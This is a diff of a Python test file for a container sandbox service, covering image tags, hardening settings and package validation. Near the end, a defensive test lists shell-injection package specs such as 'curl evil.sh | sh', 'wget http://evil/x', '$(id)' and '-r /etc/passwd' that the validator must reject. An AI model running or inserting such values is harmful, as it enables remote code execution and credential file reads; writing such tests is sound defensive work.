@@ -1,4 +1,5 @@
 """Shared container machinery: image tags, dockerfile generation, build."""
+
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
@@ -13,6 +14,7 @@ from app.services.container_runtime import (
     cleanup_owned_sandbox_containers,
     ensure_docker_image,
     image_tag_for,
+    runtime_source_digest,
 )
 from tests.sandbox_fakes import FakeDockerClient
 
@@ -20,11 +22,33 @@ from tests.sandbox_fakes import FakeDockerClient
 def test_image_tag_includes_schema_version():
     payload = {"id": "env1", "packages_hash": "abc123"}
     tag = image_tag_for(payload)
-    assert tag == f"nodyra-env:env1-abc123-{IMAGE_SCHEMA_VERSION}"
+    assert tag == f"nodyra-env:env1-abc123-{runtime_source_digest()}-{IMAGE_SCHEMA_VERSION}"
 
 
 def test_image_tag_defaults():
-    assert image_tag_for({}) == f"nodyra-env:default-latest-{IMAGE_SCHEMA_VERSION}"
+    assert (
+        image_tag_for({})
+        == f"nodyra-env:default-latest-{runtime_source_digest()}-{IMAGE_SCHEMA_VERSION}"
+    )
+
+
+def test_runtime_source_update_invalidates_base_and_environment_images(tmp_path, monkeypatch):
+    from app.services import container_runtime as runtime
+
+    source = tmp_path / "packages/core/nodyra/engine.py"
+    source.parent.mkdir(parents=True)
+    source.write_text("VERSION = 1\n")
+    monkeypatch.setattr(runtime, "_workspace_root", lambda: tmp_path)
+    runtime_source_digest.cache_clear()
+    try:
+        original_base = runtime.base_image_tag("3.12")
+        original_env = image_tag_for({"id": "same-env", "packages_hash": "same-packages"})
+        source.write_text("VERSION = 2\n")
+        runtime_source_digest.cache_clear()
+        assert runtime.base_image_tag("3.12") != original_base
+        assert image_tag_for({"id": "same-env", "packages_hash": "same-packages"}) != original_env
+    finally:
+        runtime_source_digest.cache_clear()
 
 
 def test_build_skipped_when_cached():
@@ -76,7 +100,7 @@ def test_stream_demuxer_partial_frames_across_recvs():
     out = b""
     # deliver one byte at a time — header and payload split arbitrarily
     for i in range(len(framed)):
-        out += d.feed(framed[i:i + 1])
+        out += d.feed(framed[i : i + 1])
     assert out == payload
 
 
@@ -161,9 +185,7 @@ def test_env_image_derives_from_base():
         return orig(fileobj=fileobj, tag=tag, rm=rm, **kw)
 
     client.images.build = capture
-    ensure_docker_image(
-        client, "t1", {"python_version": "3.12", "packages": ["requests==2.31.0"]}
-    )
+    ensure_docker_image(client, "t1", {"python_version": "3.12", "packages": ["requests==2.31.0"]})
     base = base_image_tag("3.12")
     assert client.images.built[0] == base  # base built first
     assert client.images.built[1] == "t1"
@@ -245,10 +267,7 @@ from app.services.container_runtime import detect_runtime  # noqa: E402
 def test_probe_auto_prefers_strongest():
     assert detect_runtime(FakeDockerClient(runtimes=("runc",)), "auto") == "runc"
     assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc")), "auto") == "runsc"
-    assert (
-        detect_runtime(FakeDockerClient(runtimes=("runc", "runsc", "kata")), "auto")
-        == "kata"
-    )
+    assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc", "kata")), "auto") == "kata"
 
 
 def test_probe_explicit_runtime_must_exist():
@@ -281,7 +300,8 @@ from app.services.container_runtime import (  # noqa: E402
 )
 
 
-def test_hardening_kwargs_complete():
+def test_hardening_kwargs_complete(monkeypatch):
+    monkeypatch.delenv("NODYRA_ALLOW_PRIVATE_EGRESS", raising=False)
     kw = hardening_kwargs(runtime="runsc", network="nodyra-sandbox")
     assert kw["cap_drop"] == ["ALL"]
     assert kw["security_opt"] == ["no-new-privileges:true"]
@@ -299,16 +319,17 @@ def test_hardening_kwargs_complete():
     # rootfs is read-only, so HOME must point at the writable tmpfs
     assert kw["environment"] == {
         "HOME": "/tmp",
+        "NODYRA_ALLOW_PRIVATE_EGRESS": "0",
+        "NODYRA_MAX_INPUT_BYTES": str(settings.max_artifact_bytes),
         "NODYRA_CODE_NODE_TIMEOUT_SECONDS": str(settings.code_node_timeout_seconds),
-        "NODYRA_RUNTIME_HEARTBEAT_SECONDS": str(
-            settings.runtime_heartbeat_interval_seconds
-        ),
+        "NODYRA_RUNTIME_HEARTBEAT_SECONDS": str(settings.runtime_heartbeat_interval_seconds),
     }
 
 
 def test_hardening_kwargs_overrides():
     kw = hardening_kwargs(
-        runtime="runc", network="bridge",
+        runtime="runc",
+        network="bridge",
         overrides={"mem_limit": "4g", "pids_limit": 1024, "nano_cpus": 2_000_000_000},
     )
     assert kw["mem_limit"] == "4g"
@@ -321,12 +342,8 @@ def test_hardening_kwargs_overrides():
 
 def test_owner_label_and_orphan_cleanup_are_replica_scoped():
     client = FakeDockerClient()
-    owned_labels = hardening_kwargs(
-        runtime="runc", network="bridge", owner_id="worker-a"
-    )["labels"]
-    peer_labels = hardening_kwargs(
-        runtime="runc", network="bridge", owner_id="worker-b"
-    )["labels"]
+    owned_labels = hardening_kwargs(runtime="runc", network="bridge", owner_id="worker-a")["labels"]
+    peer_labels = hardening_kwargs(runtime="runc", network="bridge", owner_id="worker-b")["labels"]
     owned = client.containers.run("image", name="owned", labels=owned_labels)
     peer = client.containers.run("image", name="peer", labels=peer_labels)
 
@@ -407,10 +424,15 @@ def test_docker_provider_spawns_hardened(monkeypatch):
     async def scenario():
         task = asyncio.create_task(
             provider.assign_docker_run(
-                lambda: FakeSession(), "run123", "pool1",
-                {"id": "env1", "packages_hash": "h", "python_version": "3.12",
-                 "packages": []},
-                {"nodes": [], "edges": []}, None, None, [], on_event,
+                lambda: FakeSession(),
+                "run123",
+                "pool1",
+                {"id": "env1", "packages_hash": "h", "python_version": "3.12", "packages": []},
+                {"nodes": [], "edges": []},
+                None,
+                None,
+                [],
+                on_event,
             )
         )
         for _ in range(50):
@@ -427,9 +449,66 @@ def test_docker_provider_spawns_hardened(monkeypatch):
     call = client.run_calls[0]
     assert call["cap_drop"] == ["ALL"]
     assert call["runtime"] == "runsc"
-    assert call["mem_limit"] == "2g"          # pool override applied
+    assert call["mem_limit"] == "2g"  # pool override applied
     assert call["read_only"] is True
-    run_msgs = [m for m in client.containers_made[0].sock._sock.sent_messages()
-                if m.get("type") == "run"]
-    assert len(run_msgs) == 1                  # double-send fixed
-    assert client.containers_made[0].removed   # torn down in finally
+    run_msgs = [
+        m for m in client.containers_made[0].sock._sock.sent_messages() if m.get("type") == "run"
+    ]
+    assert len(run_msgs) == 1  # double-send fixed
+    assert client.containers_made[0].removed  # torn down in finally
+
+
+# --- PEP 508 environment markers (F-12) --------------------------------------
+
+
+@pytest.mark.parametrize(
+    "spec",
+    [
+        "zxing-cpp>=2.2; sys_platform=='win32'",
+        "audioop-lts>=0.2; python_version>='3.13'",
+        'pywin32>=306 ; platform_system == "Windows"',
+        "uvloop>=0.19; sys_platform != 'win32' and python_version < '3.14'",
+    ],
+)
+def test_environment_markers_are_accepted(spec):
+    """Node requirements carry PEP 508 markers, and package preflight tells the
+    user to add those exact strings to their environment.
+
+    The hand-rolled specifier regex rejected every one of them, so following the
+    product's own advice made the sandbox image build fail. Two shipped node
+    requirements (barcode_qr_decode, twilio_media_streams_start) hit this.
+    """
+    assert _validate_packages([spec]) == [spec]
+
+
+@pytest.mark.parametrize(
+    "evil",
+    [
+        "requests; curl evil.sh | sh",
+        "requests && wget http://evil/x",
+        "requests`id`",
+        "requests$(id)",
+        "requests\nnumpy",
+        "--index-url=http://evil/simple",
+        "-r /etc/passwd",
+        "requests > /tmp/pwned",
+    ],
+)
+def test_shell_injection_is_still_rejected(evil):
+    """Accepting markers must not widen the door for anything else."""
+    with pytest.raises(ValueError):
+        _validate_packages([evil])
+
+
+def test_marker_bearing_specs_are_shell_quoted_in_the_dockerfile():
+    """A marker contains spaces, quotes and comparison operators. Interpolated
+    raw into ``RUN uv pip install`` it would split into several shell words and
+    install the wrong thing (or nothing)."""
+    from app.services.container_runtime import _install_command
+
+    command = _install_command(["zxing-cpp>=2.2; sys_platform=='win32'", "numpy"])
+    assert "'zxing-cpp>=2.2; sys_platform=='\"'\"'win32'\"'\"''" in command or (
+        command.count("'") >= 2 and "; sys_platform" not in command.split("'")[0]
+    )
+    # The plain spec needs no quoting noise around it.
+    assert "numpy" in command
